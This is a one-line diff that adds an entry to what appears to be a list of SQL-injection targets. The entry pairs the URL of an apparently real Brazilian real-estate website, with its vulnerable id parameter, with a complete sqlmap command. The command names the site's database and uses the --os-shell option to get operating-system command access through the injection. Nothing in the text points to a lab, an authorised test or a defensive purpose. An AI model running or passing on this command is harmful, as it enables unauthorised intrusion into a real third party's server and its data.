@@ -1,0 +1,1 @@
+http://www.cosimaimoveis.com.br/imovel.php?id=278 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.cosimaimoveis.com.br/imovel.php?id=278 -D cosimaimoveis02 --os-shell
